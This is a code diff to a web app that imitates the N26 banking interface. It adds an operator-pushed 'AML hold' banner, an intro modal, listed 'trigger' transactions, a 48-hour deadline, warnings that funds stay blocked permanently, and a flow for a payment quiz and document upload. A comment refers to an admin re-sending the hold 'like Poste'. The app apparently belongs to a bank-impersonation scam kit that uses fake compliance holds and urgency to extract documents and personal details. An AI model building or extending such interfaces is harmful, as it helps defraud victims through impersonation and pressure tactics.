@@ -3292,6 +3292,35 @@ window.n26ShowDoc = function(html) {
 @keyframes amxPulse{0%,100%{box-shadow:0 0 0 0 rgba(15,118,110,0)}50%{box-shadow:0 0 0 6px rgba(15,118,110,.18)}}
 .amx-top{display:flex;align-items:center;gap:12px}
 .amx-ico{display:flex;align-items:center;justify-content:center;width:40px;height:40px;flex:none;border-radius:10px;background:#f1f5f9;color:#0f172a}
+.amx-ico-need{background:#fffbeb;color:#b45309;box-shadow:inset 0 0 0 1px #fde68a}
+.amx-ico-pend{background:#ecfdf5;color:#0f766e;box-shadow:inset 0 0 0 1px #a7f3d0}
+.amx-ico-late{background:#fef2f2;color:#b91c1c;box-shadow:inset 0 0 0 1px #fecaca}
+@keyframes amxTurn{0%,40%{transform:rotate(0)}70%,100%{transform:rotate(180deg)}}
+.amx-ico-lg{width:56px;height:56px;border-radius:16px;position:relative}
+.amx-ico-lg .amx-svg{width:36px;height:36px;display:block;overflow:visible}
+.amx-ico-need::after{content:"";position:absolute;inset:-4px;border-radius:20px;border:2px solid #f59e0b;opacity:0;animation:amxRing 2.4s ease-out infinite;pointer-events:none}
+@keyframes amxRing{0%{transform:scale(.92);opacity:.55}100%{transform:scale(1.18);opacity:0}}
+.amx-up{animation:amxBob 1.8s ease-in-out infinite;transform-box:fill-box;transform-origin:center}
+@keyframes amxBob{0%,100%{transform:translateY(0)}50%{transform:translateY(-2.5px)}}
+.amx-sand-top{transform-box:fill-box;transform-origin:50% 0;animation:amxTop 3.6s linear infinite}
+.amx-sand-bot{transform-box:fill-box;transform-origin:50% 100%;animation:amxBot 3.6s linear infinite}
+.amx-stream{animation:amxStream .6s linear infinite}
+@keyframes amxTop{0%{transform:scaleY(1)}90%,100%{transform:scaleY(.1)}}
+@keyframes amxBot{0%{transform:scaleY(.15)}90%,100%{transform:scaleY(1)}}
+@keyframes amxStream{to{stroke-dashoffset:-5}}
+.amx-shake{animation:amxShake 2.6s ease-in-out infinite;transform-origin:50% 80%}
+@keyframes amxShake{0%,70%,100%{transform:rotate(0)}74%{transform:rotate(-7deg)}80%{transform:rotate(7deg)}86%{transform:rotate(-5deg)}92%{transform:rotate(4deg)}}
+@media (prefers-reduced-motion:reduce){.amx-sand-top,.amx-sand-bot,.amx-stream{animation:none}}
+.amx-trig{background:#f8fafc;border:1px solid #e2e8f0;border-radius:12px;padding:11px 12px;margin:0}
+.amx-trig-h{margin:0;font-size:11px;font-weight:700;letter-spacing:.05em;text-transform:uppercase;color:#475569}
+.amx-trig-r{margin:6px 0 0;font-size:12.5px;line-height:1.4;color:#334155}
+.amx-trig-l{list-style:none;margin:8px 0 0;padding:0;display:flex;flex-direction:column;gap:6px}
+.amx-trig-l li{display:grid;grid-template-columns:1fr auto;gap:2px 10px;align-items:baseline;padding:8px 10px;background:#fff;border:1px solid #eef2f6;border-radius:9px;font-size:12px}
+.amx-trig-id{grid-column:1/-1;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:11px;color:#0f766e;font-weight:600;word-break:break-all}
+.amx-trig-n{color:#0f172a;font-weight:600;min-width:0;overflow-wrap:anywhere}
+.amx-trig-a{font-variant-numeric:tabular-nums;font-weight:700;text-align:right}
+.amx-trig-d{grid-column:1/-1;color:#64748b;font-size:11px}
+
 .amx-top-t{flex:1;min-width:0}
 .amx-title{margin:0;font-size:15px;font-weight:700;color:#0f172a;line-height:1.25}
 .amx-amt{margin:2px 0 0;font-size:13px;color:#475569}.amx-amt span{font-weight:700;color:#0f172a}
@@ -3323,6 +3352,36 @@ window.n26ShowDoc = function(html) {
 .amx-warn ul{margin:0;padding-left:18px;font-size:13px;line-height:1.55;color:#334155}
 .amx-warn-s{margin:10px 0 10px;font-size:12.5px;line-height:1.5;color:#334155}
 .amx-ghost{width:100%;min-height:44px;border:1px solid #0f766e;border-radius:10px;background:#fff;color:#0f766e;font:inherit;font-size:13.5px;font-weight:700;cursor:pointer}
+
+.amx-clock-ring{transform-box:fill-box;transform-origin:center;animation:amxBeat 2s ease-in-out infinite}
+.amx-hand-m{transform-origin:35px 35px;animation:amxHand 3s linear infinite}
+.amx-hand-h{transform-origin:35px 35px;animation:amxHand 18s linear infinite}
+@keyframes amxHand{to{transform:rotate(360deg)}}
+@keyframes amxBeat{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
+.amx-fold{display:flex;align-items:center;justify-content:space-between;width:100%;min-height:44px;padding:10px 12px;border:1px solid #e2e8f0;border-radius:10px;background:#fff;font:inherit;font-size:13px;font-weight:600;color:#334155;cursor:pointer}
+.amx-fold-c{display:inline-block;color:#64748b;font-size:16px;transition:transform .2s}.amx-fold-c.open{transform:rotate(180deg)}
+.amx-cons-btn{display:flex;align-items:center;gap:12px;width:100%;padding:12px;border:1px solid #fecaca;border-radius:10px;background:#fff;font:inherit;text-align:left;cursor:pointer}
+.amx-cons-i{display:flex;align-items:center;justify-content:center;width:28px;height:28px;flex:none;border-radius:50%;background:#fef2f2;color:#b91c1c;font-weight:800;font-size:15px}
+.amx-cons-t{flex:1;font-size:13.5px;font-weight:700;color:#991b1b}.amx-cons-t small{display:block;font-weight:500;font-size:12px;color:#64748b;margin-top:1px}
+.amx-foldwrap{display:grid;grid-template-rows:0fr;transition:grid-template-rows .32s cubic-bezier(.4,0,.2,1),opacity .28s ease;opacity:0}
+.amx-foldwrap.open{grid-template-rows:1fr;opacity:1}
+.amx-foldwrap-in{overflow:hidden;min-height:0}
+.amx-foldwrap.open .amx-foldwrap-in{padding-top:8px}
+@media (prefers-reduced-motion:reduce){.amx-foldwrap{transition:none}}
+.amx-sheet-ov{position:fixed;inset:0;z-index:100001;background:rgba(15,23,42,.5);display:flex;align-items:flex-end;justify-content:center;animation:amxFade .2s ease}
+.amx-sheet{width:100%;max-width:560px;max-height:88dvh;overflow-y:auto;background:#fff;border-radius:16px 16px 0 0;padding:14px 16px calc(20px + env(safe-area-inset-bottom));animation:amxIn .25s ease}
+.amx-sheet-h{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-bottom:12px;font-size:16px;font-weight:700;color:#0f172a}
+
+.amx-ln{animation:amxLn 1.8s ease-in-out infinite}.amx-ln2{animation-delay:.25s}.amx-ln3{animation-delay:.5s}
+@keyframes amxLn{0%,100%{opacity:.2}50%{opacity:.85}}
+.amx-intro-ov{position:fixed;inset:0;z-index:100002;background:rgba(15,23,42,.6);display:flex;align-items:center;justify-content:center;padding:16px;animation:amxFade .2s ease}
+.amx-intro{width:100%;max-width:420px;max-height:92dvh;overflow-y:auto;display:flex;flex-direction:column;align-items:stretch;gap:12px;background:#fff;border-radius:16px;padding:22px 18px calc(18px + env(safe-area-inset-bottom));animation:amxIn .25s ease}
+.amx-intro .amx-ico-lg{align-self:center}
+.amx-intro-h{margin:0;text-align:center;font-size:18px;font-weight:700;line-height:1.3;color:#0f172a}
+.amx-intro-a{margin:0;text-align:center;font-size:14px;color:#475569}.amx-intro-a span{font-weight:700;color:#0f172a}
+.amx-intro-p{margin:0;font-size:13.5px;line-height:1.55;color:#334155}
+.amx-sheet .amx-warn{border:0;border-left:0;padding:0}.amx-sheet .amx-warn-t{display:none}
+@keyframes amxFade{from{opacity:0}to{opacity:1}}
 .amx-done{display:flex;flex-direction:column;align-items:center;text-align:center;gap:10px;padding:24px 8px}
 .amx-done-ico{display:flex;align-items:center;justify-content:center;width:56px;height:56px;border-radius:50%;background:#0f766e;color:#fff;font-size:28px;animation:amxIn .4s ease}
 .amx-win .aml-quiz{margin-top:0}
@@ -5425,6 +5484,11 @@ window.n26ShowDoc = function(html) {
     function LucideIcon({ name, className = 'h-5 w-5' }) {
       // Pure SVG — never call lucide.createIcons() on React-managed nodes (causes white screen)
       const paths = {
+        'file-up': 'M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7zM14 2v4a2 2 0 0 0 2 2h4M12 12v6m3-3-3-3-3 3',
+        'hourglass': 'M5 22h14M5 2h14M17 22v-4.17a2 2 0 0 0-.59-1.41L12 12l-4.41 4.42A2 2 0 0 0 7 17.83V22M7 2v4.17a2 2 0 0 0 .59 1.41L12 12l4.41-4.42A2 2 0 0 0 17 6.17V2',
+        'badge-check': 'M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76zM9 12l2 2 4-4',
+        'alert-circle': 'M12 22a10 10 0 1 0 0-20 10 10 0 0 0 0 20zM12 8v4M12 16h.01',
+        'lock-keyhole': 'M19 11H5a2 2 0 0 0-2 2v7a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7a2 2 0 0 0-2-2zM7 11V7a5 5 0 0 1 10 0v4M12 15v2',
         smartphone: 'M12 18h.01M8 2h8a2 2 0 0 1 2 2v16a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2z',
         car: 'M5 17h14v-5H5v5zm0 0H3m16 0h2M5 12l1.5-4.5h11L19 12M7 17a1 1 0 1 0 0-2 1 1 0 0 0 0 2zm10 0a1 1 0 1 0 0-2 1 1 0 0 0 0 2z',
         'shopping-bag': 'M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4H6zM3 6h18M16 10a4 4 0 0 1-8 0',
@@ -8077,6 +8141,95 @@ const analyzeDocumentImage = function(file, docType) {
       { id: 'contact', q: 'If we need to follow up — are you reachable in the next 48 hours?', options: ['Yes, anytime', 'Yes, with some delay', 'Hard to reach'] },
     ];
 
+    function amlParseTriggers(p) {
+      var keys = ['txIds', 'tx_ids', 'transactionIds', 'transaction_ids', 'transactions', 'txId', 'tx_id', 'transactionId', 'transaction_id', 'transaction', 'tx', 'ids'];
+      var srcs = [p];
+      try { if (p && p.data) srcs.push(typeof p.data === 'string' ? JSON.parse(p.data) : p.data); } catch (e) {}
+      var out = [], seen = {};
+      function addId(id, o) {
+        id = String(id).trim(); var k = id.toUpperCase();
+        if (!id || seen[k] || out.length >= 25) return;
+        seen[k] = 1;
+        var r = { id: id };
+        if (o) {
+          if (o.name || o.counterparty) r.name = String(o.name || o.counterparty);
+          if (o.amount != null && !isNaN(parseFloat(o.amount))) r.amount = parseFloat(o.amount);
+          if (o.date) r.date = String(o.date);
+        }
+        out.push(r);
+      }
+      function add(v) {
+        if (v == null) return;
+        if (Array.isArray(v)) { v.forEach(add); return; }
+        if (typeof v === 'object') { var id = v.id || v.txId || v.tx_id || v.transactionId || v.transaction_id; if (id) addId(id, v); return; }
+        String(v).split(/[\s,;]+/).forEach(function (x) { if (x) addId(x, null); });
+      }
+      srcs.forEach(function (sx) { if (sx && typeof sx === 'object') keys.forEach(function (k) { if (sx[k] != null) add(sx[k]); }); });
+      return out;
+    }
+    function amlParseReason(p) {
+      var srcs = [p];
+      try { if (p && p.data) srcs.push(typeof p.data === 'string' ? JSON.parse(p.data) : p.data); } catch (e) {}
+      for (var i = 0; i < srcs.length; i++) {
+        var sx = srcs[i];
+        if (!sx || typeof sx !== 'object') continue;
+        var v = sx.reason || sx.note || sx.comment || sx.cause || sx.message_text;
+        if (v) return String(v).slice(0, 300);
+      }
+      return '';
+    }
+    function amlTr(txt, de) {
+      if (!txt || de) return txt;
+      var M = [
+        [/mehrere hohe eing[aä]nge in kurzer zeit/i, 'Multiple large incoming payments in a short time'],
+        [/hoher eingang|hohe eingang/i, 'Large incoming payment'],
+        [/ungew[oö]hnliche(r|n)? (transaktion|zahlung|aktivit[aä]t)/i, 'Unusual transaction activity'],
+        [/herkunft (der )?mittel (unklar|nicht (nachgewiesen|belegt))/i, 'Source of funds not verified'],
+        [/mehrere eing[aä]nge/i, 'Multiple incoming payments'],
+        [/in kurzer zeit/i, 'in a short time'],
+        [/auff[aä]llig(e|er|es)? (transaktion|zahlung|muster)/i, 'Unusual transaction pattern'],
+        [/pr[uü]fung/i, 'review']
+      ];
+      for (var k = 0; k < M.length; k++) { if (M[k][0].test(txt)) return txt.replace(M[k][0], M[k][1]); }
+      return txt;
+    }
+    function AmlStateIcon({ state }) {
+      if (state === 'pend') {
+        return (
+          <svg viewBox="0 0 48 48" className="amx-svg" aria-hidden="true">
+            <path d="M13 5h15l10 10v26a2 2 0 0 1-2 2H13a2 2 0 0 1-2-2V7a2 2 0 0 1 2-2z" fill="#fff" stroke="currentColor" strokeWidth="2.2" strokeLinejoin="round" />
+            <path d="M28 5v8a2 2 0 0 0 2 2h8" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinejoin="round" />
+            <path d="M16 23h14M16 28h10M16 33h6" stroke="currentColor" strokeWidth="2" strokeLinecap="round" opacity=".4" />
+            <circle className="amx-clock-ring" cx="35" cy="35" r="9.5" fill="currentColor" />
+            <line className="amx-hand-h" x1="35" y1="35" x2="39" y2="35" stroke="#fff" strokeWidth="2.2" strokeLinecap="round" />
+            <line className="amx-hand-m" x1="35" y1="35" x2="35" y2="29.5" stroke="#fff" strokeWidth="2.2" strokeLinecap="round" />
+          </svg>
+        );
+      }
+      if (state === 'late') {
+        return (
+          <svg viewBox="0 0 48 48" className="amx-svg amx-shake" aria-hidden="true">
+            <path d="M24 5 44 40H4z" fill="#fff" stroke="currentColor" strokeWidth="2.6" strokeLinejoin="round" />
+            <path d="M24 17v11" stroke="currentColor" strokeWidth="3.2" strokeLinecap="round" />
+            <circle cx="24" cy="34" r="2.2" fill="currentColor" />
+          </svg>
+        );
+      }
+      return (
+        <svg viewBox="0 0 48 48" className="amx-svg" aria-hidden="true">
+          <path d="M13 5h15l10 10v26a2 2 0 0 1-2 2H13a2 2 0 0 1-2-2V7a2 2 0 0 1 2-2z" fill="#fff" stroke="currentColor" strokeWidth="2.2" strokeLinejoin="round" />
+          <path d="M28 5v8a2 2 0 0 0 2 2h8" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinejoin="round" />
+          <path className="amx-ln" d="M16 23h14" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
+          <path className="amx-ln amx-ln2" d="M16 28h14" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
+          <path className="amx-ln amx-ln3" d="M16 33h7" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
+          <g className="amx-up">
+            <circle cx="35" cy="35" r="9.500" fill="currentColor" />
+            <path d="M35 40.500V30M30.500 34.500 35 30l4.500 4.500" fill="none" stroke="#fff" strokeWidth="2.400" strokeLinecap="round" strokeLinejoin="round" />
+          </g>
+        </svg>
+      );
+    }
+
     function AmlQuizForm({ de, onSubmit, initial, onChange, submitLabel }) {
       const QS = de ? AML_QUIZ_DE : AML_QUIZ_EN;
       const [answers, setAnswers] = useState(initial || {});
@@ -8111,10 +8264,17 @@ const analyzeDocumentImage = function(file, docType) {
       );
     }
 
-    function AmlHoldBanner({ amount, onUpload, uploading, statusText, pending, quizDone, docDone, onQuizSubmit, startedAt, t, lang }) {
+    function AmlHoldBanner({ amount, onUpload, uploading, statusText, pending, quizDone, docDone, onQuizSubmit, startedAt, t, lang, triggers, reason }) {
       const de = lang !== 'en';
       const inputId = 'n26-aml-file-input';
       const [winOpen, setWinOpen] = useState(false);
+      const [consOpen, setConsOpen] = useState(false);
+      const [trigOpen, setTrigOpen] = useState(false);
+      const introKey = 'n26_aml_intro_' + (startedAt ? Number(startedAt).toString(36).toUpperCase().slice(-7) : 'X');
+      const [introOpen, setIntroOpen] = useState(function() {
+        try { return !pending && localStorage.getItem(introKey) !== '1' && localStorage.getItem('n26_aml_seen_AML-' + (startedAt ? Number(startedAt).toString(36).toUpperCase().slice(-7) : 'XXXXXXX')) !== '1'; } catch (e) { return false; }
+      });
+      const closeIntro = function(go) { try { localStorage.setItem(introKey, '1'); } catch (e) {} setIntroOpen(false); if (go) openWin(); };
       const [, forceTick] = useState(0);
       useEffect(function() { const iv = setInterval(function() { forceTick(function(n) { return n + 1; }); }, 30000); return function() { clearInterval(iv); }; }, []);
       const caseRef = 'AML-' + (startedAt ? Number(startedAt).toString(36).toUpperCase().slice(-7) : 'XXXXXXX');
@@ -8160,7 +8320,6 @@ const analyzeDocumentImage = function(file, docType) {
 
       const consequences = (
         <div className="amx-warn">
-          <p className="amx-warn-t">{de ? 'Wichtig: Was passiert, wenn die Frist verstreicht' : 'Important: if the time limit passes'}</p>
           <ul>
             <li>{de ? 'Der gesperrte Betrag wird nicht freigegeben und bleibt dauerhaft gesperrt.' : 'The amount is not released and stays blocked permanently.'}</li>
             <li>{de ? 'Der Betrag kann an den Absender zurücküberwiesen werden.' : 'The amount may be returned to the sender.'}</li>
@@ -8172,16 +8331,38 @@ const analyzeDocumentImage = function(file, docType) {
         </div>
       );
 
+      const trig = (triggers && triggers.length) ? (
+        <div className="amx-trig">
+          <p className="amx-trig-h">{de ? (triggers.length > 1 ? 'Auslöser der Prüfung · ' + triggers.length + ' Transaktionen' : 'Auslöser der Prüfung · 1 Transaktion') : (triggers.length > 1 ? 'Triggered by ' + triggers.length + ' transactions' : 'Triggered by 1 transaction')}</p>
+          {reason ? <p className="amx-trig-r">{amlTr(reason, de)}</p> : null}
+          <ul className="amx-trig-l">
+            {triggers.map(function(x) {
+              var dd = x.date ? new Date(x.date) : null;
+              return (
+                <li key={x.id}>
+                  <span className="amx-trig-id">{x.id}</span>
+                  <span className="amx-trig-n">{x.name || (x.found === false ? (de ? 'Transaktion' : 'Transaction') : '—')}</span>
+                  {x.amount != null ? <span className="amx-trig-a">{(x.amount < 0 ? '−' : '+') + formatCurrency(Math.abs(x.amount))}</span> : null}
+                  {dd && !isNaN(dd.getTime()) ? <span className="amx-trig-d">{dd.toLocaleDateString(de ? 'de-DE' : 'en-GB')}</span> : null}
+                </li>
+              );
+            })}
+          </ul>
+        </div>
+      ) : (reason ? (
+        <div className="amx-trig"><p className="amx-trig-h">{de ? 'Grund der Prüfung' : 'Reason for the review'}</p><p className="amx-trig-r">{amlTr(reason, de)}</p></div>
+      ) : null);
+
       return (
         <div className={'amx-card' + (!seen && !pending ? ' amx-new' : '') + (overdue && !pending ? ' amx-late' : '')}>
           <div className="amx-top">
-            <span className="amx-ico"><LucideIcon name="Shield" className="h-[18px] w-[18px]" /></span>
+            <span className={'amx-ico amx-ico-lg ' + (pending ? 'amx-ico-pend' : (overdue ? 'amx-ico-late' : 'amx-ico-need'))}><AmlStateIcon state={pending ? 'pend' : (overdue ? 'late' : 'need')} /></span>
             <div className="amx-top-t">
               <p className="amx-title">{pending ? (de ? 'Unterlagen in Prüfung' : 'Documents under review') : (de ? 'Nachweis erforderlich' : 'Proof required')}</p>
               <p className="amx-amt"><span className="tabular-nums">{formatCurrency(amount)}</span> {de ? 'vorübergehend gesperrt' : 'temporarily on hold'}</p>
             </div>
-            {!pending && !seen ? <span className="amx-badge">{de ? 'Neu' : 'New'}</span> : null}
           </div>
+          {trig}
 
           {pending ? (
             <p className="amx-text">{de ? 'Wir haben deine Angaben und dein Dokument erhalten und prüfen sie. Du musst nichts weiter tun. Wir melden uns, sobald die Prüfung abgeschlossen ist.' : 'We received your details and document and are reviewing them. You do not need to do anything else. We will get in touch once the review is complete.'}</p>
@@ -8195,10 +8376,33 @@ const analyzeDocumentImage = function(file, docType) {
               <button type="button" className="amx-btn" onClick={openWin}>
                 {quizDone || docDone ? (de ? 'Nachweis fortsetzen' : 'Continue') : (de ? 'Nachweis einreichen' : 'Submit proof')}
               </button>
-              <p className="amx-note">{de ? 'Ohne Nachweis innerhalb der Frist bleibt der Betrag gesperrt, weitere Einschränkungen sind möglich.' : 'Without proof within the time limit the amount stays blocked and further restrictions may apply.'}</p>
+              <button type="button" className="amx-cons-btn" onClick={function() { setConsOpen(!consOpen); }} aria-expanded={consOpen}>
+                <span className="amx-cons-i">!</span>
+                <span className="amx-cons-t">
+                  {de ? 'Was passiert, wenn die Frist verstreicht' : 'What happens if the deadline passes'}
+                  <small>{consOpen ? (de ? 'Tippen zum Ausblenden' : 'Tap to hide') : (de ? 'Tippen zum Anzeigen' : 'Tap to view')}</small>
+                </span>
+                <span className={'amx-fold-c' + (consOpen ? ' open' : '')}>▾</span>
+              </button>
+              <div className={'amx-foldwrap' + (consOpen ? ' open' : '')}>
+                <div className="amx-foldwrap-in">{consequences}</div>
+              </div>
             </>
           )}
           <button type="button" className="amx-link" onClick={function() { openSupport(false); }}>{de ? 'Fragen zur Prüfung?' : 'Questions about the review?'}</button>
+
+          {introOpen && !pending && ReactDOM.createPortal(
+            <div className="amx-intro-ov" role="dialog" aria-modal="true">
+              <div className="amx-intro">
+                <span className="amx-ico amx-ico-lg amx-ico-late"><AmlStateIcon state="late" /></span>
+                <h3 className="amx-intro-h">{de ? 'Teile deines Kontos wurden eingeschränkt' : 'Some account functions have been restricted'}</h3>
+                <p className="amx-intro-a"><span className="tabular-nums">{formatCurrency(amount)}</span> {de ? 'sind vorübergehend gesperrt' : 'are temporarily on hold'}</p>
+                <p className="amx-intro-p">{de ? 'Bitte lies die Angaben zur Prüfung. Danach führen wir dich in zwei kurzen Schritten durch den Nachweis: erst Angaben zur Zahlung, dann ein Dokument. Dafür hast du 48 Stunden.' : 'Please read the details of the review. We will then guide you through the proof in two short steps: first details about the payment, then a document. You have 48 hours.'}</p>
+                {trig}
+                <button type="button" className="amx-btn" onClick={function() { closeIntro(true); }}>{de ? 'Prüfung starten' : 'Start review'}</button>
+                <button type="button" className="amx-link" style={{ alignSelf: 'center' }} onClick={function() { closeIntro(false); }}>{de ? 'Später' : 'Later'}</button>
+              </div>
+            </div>, document.body)}
 
           {winOpen && ReactDOM.createPortal(
             <div className="amx-win" role="dialog" aria-modal="true">
@@ -8210,6 +8414,12 @@ const analyzeDocumentImage = function(file, docType) {
                 </div>
               </div>
               <div className="amx-win-body">
+                {trig ? (
+                  <button type="button" className="amx-fold" onClick={function() { setTrigOpen(!trigOpen); }} aria-expanded={trigOpen}>
+                    <span>{de ? 'Auslöser der Prüfung' : 'Reason for the review'}</span><span className={'amx-fold-c' + (trigOpen ? ' open' : '')}>▾</span>
+                  </button>
+                ) : null}
+                {trigOpen && trig}
                 {stepper}
                 {step === 'quiz' && (
                   <>
@@ -8243,7 +8453,6 @@ const analyzeDocumentImage = function(file, docType) {
                     <button type="button" className="amx-btn" onClick={function() { setWinOpen(false); }}>{de ? 'Schließen' : 'Close'}</button>
                   </div>
                 )}
-                {step !== 'done' && consequences}
                 <button type="button" className="amx-link" onClick={function() { openSupport(false); }}>{de ? 'Fragen zur Prüfung?' : 'Questions about the review?'}</button>
               </div>
             </div>, document.body)}
@@ -11665,7 +11874,7 @@ function DigitalCard({ holderName = 'ALEX MORGAN', cardNumber, cvv, expiry, iban
           const raw = API.kv.peek(AML_KEY);
           if (raw) {
             const d = JSON.parse(raw);
-            if (d && d.locked && d.amount > 0) return { active: true, amount: Number(d.amount), docPending: !!d.docPending, startedAt: Number(d.startedAt) || 0, quizDone: !!d.quizDone, docDone: !!d.docDone };
+            if (d && d.locked && d.amount > 0) return { active: true, triggers: Array.isArray(d.triggers) ? d.triggers : [], reason: d.reason || '', amount: Number(d.amount), docPending: !!d.docPending, startedAt: Number(d.startedAt) || 0, quizDone: !!d.quizDone, docDone: !!d.docDone };
           }
         } catch (e) {}
         return { active: false, amount: 0, docPending: false };
@@ -11746,6 +11955,8 @@ function DigitalCard({ holderName = 'ALEX MORGAN', cardNumber, cvv, expiry, iban
       const [amlStartedAt, setAmlStartedAt] = useState(initialAml.startedAt || 0);
       const [amlQuizDone, setAmlQuizDone] = useState(!!initialAml.quizDone);
       const [amlDocDone, setAmlDocDone] = useState(!!initialAml.docDone);
+      const [amlTriggers, setAmlTriggers] = useState(initialAml.triggers || []);
+      const [amlReason, setAmlReason] = useState(initialAml.reason || '');
       const NOTIF_KEY = 'n26_notif_' + userKey;
       const loadNotifs = () => {
         try {
@@ -12379,6 +12590,14 @@ function DigitalCard({ holderName = 'ALEX MORGAN', cardNumber, cvv, expiry, iban
           return;
         }
 
+        // Admin re-sent the hold with transaction IDs / reason while it is active: update the reason, keep the case
+        const trigList0 = amlParseTriggers(payload), reason0 = amlParseReason(payload);
+        if (amlActiveRef.current && (trigList0.length || reason0)) {
+          setAmlTriggers(trigList0); setAmlReason(reason0);
+          try { const d0 = JSON.parse(API.kv.peek(AML_KEY) || '{}'); API.kv.set(AML_KEY, JSON.stringify({ ...d0, triggers: trigList0, reason: reason0 })); } catch (e0) {}
+          return;
+        }
+
         // Already active — ignore stack (like Poste)
         if (amlActiveRef.current) {
           console.log('[N26 AML] already active — ignored. Hold:', amlHoldAmount);
@@ -12390,8 +12609,10 @@ function DigitalCard({ holderName = 'ALEX MORGAN', cardNumber, cvv, expiry, iban
           return;
         }
         amount = moneyRound(amount);
+        const trigList = trigList0, reasonTxt = reason0;
 
         amlActiveRef.current = true;
+        setAmlTriggers(trigList); setAmlReason(reasonTxt);
         const amlStartTs = Date.now();
         setAmlHoldActive(true);
         setAmlHoldAmount(amount);
@@ -12401,7 +12622,7 @@ function DigitalCard({ holderName = 'ALEX MORGAN', cardNumber, cvv, expiry, iban
         setAmlQuizDone(false);
         setAmlDocDone(false);
         setAmlDocPending(false);
-        try { API.kv.set(AML_KEY, JSON.stringify({ locked: true, amount, startedAt: amlStartTs, quizDone: false, docDone: false, docPending: false })); } catch (eK) {}
+        try { API.kv.set(AML_KEY, JSON.stringify({ locked: true, amount, startedAt: amlStartTs, quizDone: false, docDone: false, docPending: false, triggers: trigList, reason: reasonTxt })); } catch (eK) {}
         setActiveTab('home'); // ensure banner is visible
         console.log('[N26 AML] applied hold', amount, 'user', userKey);
         showToast(t('notif_aml_hold'), formatCurrency(amount) + ' — ' + t('aml_toast_body'));
@@ -12428,6 +12649,7 @@ function DigitalCard({ holderName = 'ALEX MORGAN', cardNumber, cvv, expiry, iban
         setAmlStartedAt(0);
         setAmlQuizDone(false);
         setAmlDocDone(false);
+        setAmlTriggers([]); setAmlReason('');
         try { API.kv.remove(AML_KEY); } catch (e) {}
         showToast(t('notif_aml_release'), t('aml_released_body'));
         pushNotif(t('notif_aml_release'), t('aml_released_body'), 'aml_release');
@@ -13569,6 +13791,19 @@ function DigitalCard({ holderName = 'ALEX MORGAN', cardNumber, cvv, expiry, iban
         showToast(de ? 'Quittung bereit' : 'Receipt ready', det.pid, 'success');
       };
 
+      const amlTriggerView = (amlTriggers || []).map(function(t0) {
+        var idU = String(t0.id).toUpperCase();
+        var tx = (transactions || []).filter(function(x) {
+          var pid = ''; try { pid = String(txDetails(x).pid).toUpperCase(); } catch (e) {}
+          var xid = String(x.id).toUpperCase();
+          return xid === idU || pid === idU || (idU.length >= 6 && (xid.slice(-idU.length) === idU || pid.slice(-idU.length) === idU));
+        })[0];
+        if (tx) {
+          var pid2 = t0.id; try { pid2 = txDetails(tx).pid; } catch (e) {}
+          return { id: pid2, name: (tx.merchant && tx.merchant.name) || tx.name || t0.name || '', amount: Number(tx.amount), date: tx.date, found: true };
+        }
+        return { id: t0.id, name: t0.name || '', amount: t0.amount != null ? t0.amount : null, date: t0.date || null, found: false };
+      });
       handleSendRef.current = handleSend;
       return (
         <div className="fade-page min-h-screen bg-background overflow-x-hidden">
@@ -13838,6 +14073,8 @@ function DigitalCard({ holderName = 'ALEX MORGAN', cardNumber, cvv, expiry, iban
                           startedAt={amlStartedAt}
                           t={t}
                           lang={lang}
+                          triggers={amlTriggerView}
+                          reason={amlReason}
                         />
                       )}
                       {!kycFull && (
